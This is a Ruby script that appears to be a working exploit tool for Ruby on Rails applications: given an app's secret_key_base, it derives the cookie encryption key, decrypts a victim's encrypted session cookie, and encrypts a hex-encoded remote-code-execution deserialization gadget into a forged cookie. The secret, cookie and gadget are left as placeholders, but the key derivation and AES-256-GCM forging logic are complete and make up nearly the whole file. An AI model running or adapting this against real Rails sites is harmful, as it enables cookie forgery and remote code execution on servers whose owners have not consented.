require "openssl"
require "base64"
require "uri"
require 'json'

###### Variables
COOKIE_RAW = URI.unescape("<cookie to decrypt>")
APP_NAME = "<app name>::Application"
SECRET_KEY_BASE="<secret key base in hex from credentials.yml.enc>"
RCE_PAYLOAD_GADGET="<payload of rce gadget in hex>"
######

def secret_key_base
  SECRET_KEY_BASE
end

$secret = secret_key_base()
$salt = "authenticated encrypted cookie"
$cipher = "aes-256-gcm"
$iterations = 1000

def new_cipher
  OpenSSL::Cipher.new($cipher)
end

def generate_key(salt, key_size = 32)
  OpenSSL::PKCS5.pbkdf2_hmac_sha1($secret, salt, $iterations, key_size)
end

def aead_mode?
  @aead_mode ||= new_cipher.authenticated?
end

def _encrypt(key, value, **metadata_options)
  cipher = new_cipher
  cipher.encrypt
  cipher.key = key

  # Rely on OpenSSL for the initialization vector
  iv = cipher.random_iv
  cipher.auth_data = "" if aead_mode?

  encrypted_data = cipher.update(value)
  encrypted_data << cipher.final

  blob = "#{::URI.encode_www_form_component Base64.strict_encode64 encrypted_data}--#{::URI.encode_www_form_component Base64.strict_encode64 iv}"
  blob = "#{blob}--#{::URI.encode_www_form_component Base64.strict_encode64 cipher.auth_tag}" if aead_mode?
  blob
end

def _decrypt(key, encrypted_message)
  cipher = new_cipher
  encrypted_data, iv, auth_tag = encrypted_message.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }

  # Currently the OpenSSL bindings do not raise an error if auth_tag is
  # truncated, which would allow an attacker to easily forge it. See
  # https://github.com/ruby/openssl/issues/63
  raise InvalidMessage if (auth_tag.nil? || auth_tag.bytes.length != 16)

  cipher.decrypt
  cipher.key = key
  cipher.iv  = iv
  if aead_mode?
    cipher.auth_tag = auth_tag
    cipher.auth_data = ""
  end

  decrypted_data = cipher.update(encrypted_data)
  decrypted_data << cipher.final

  decrypted_data

end

key = generate_key($salt)
decrypted_data = _decrypt(key, COOKIE_RAW)
puts decrypted_data

datain = [RCE_PAYLOAD_GADGET].pack('H*')

blob = _encrypt(key, datain)
puts blob

